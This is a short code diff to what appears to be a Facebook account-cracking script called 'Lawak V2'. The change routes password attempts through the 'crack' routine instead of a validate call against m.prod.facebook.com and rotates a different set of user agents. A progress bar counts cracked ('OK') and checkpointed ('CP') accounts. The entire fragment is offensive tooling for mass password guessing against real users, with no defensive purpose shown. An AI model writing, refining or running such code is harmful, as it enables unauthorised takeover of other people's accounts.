@@ -612,7 +612,7 @@ def passwrd():
                 if "validate" in method:
                     pool.submit(crack, idf, pwv)
                 else:
-                    pool.submit(validate, idf, pwv,'m.prod.facebook.com')
+                    pool.submit(crack, idf, pwv)
         print("")
     Console().print(
         Panel(
@@ -633,7 +633,7 @@ def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	#ua = useragent()
-	ua = random.choice(ugen) 
+	ua = random.choice(prem) 
 	ses = requests.Session()
 	prog.update(des,description=f"{h}Lawak V2{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
